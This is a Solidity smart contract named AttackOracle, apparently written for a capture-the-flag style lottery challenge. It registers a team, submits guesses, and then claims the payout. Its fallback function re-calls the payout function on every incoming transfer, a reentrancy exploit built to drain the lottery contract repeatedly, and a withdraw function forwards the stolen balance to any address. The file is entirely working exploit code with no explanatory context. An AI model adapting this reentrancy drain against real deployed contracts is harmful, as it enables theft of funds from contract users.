// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

interface ILottery {
    function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function payoutWinningTeam(address _team) external returns (bool);
}

contract AttackOracle { // 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A
    ILottery lottery;

    constructor(address lotteryAddress) payable {
        lottery = ILottery(lotteryAddress);
    }

    function attack() public {

        lottery.payoutWinningTeam(address(this));    
    }

    function setup() public {
        lottery.registerTeam{value: 1_000_001 }(address(this), "Team_3", "123abc");
        
        for(uint i; i < 20 ; i++) {
            lottery.makeAGuess(address(this), 51);
            i++;       
        } 
    }

    function withdraw(address payout) public returns(bool) {
        (bool sent, ) = address(payout).call{value: address(this).balance }("");
        require(sent);
        return sent;
    }

    fallback() external payable {
        attack();
    }

    receive() external payable {
    }
}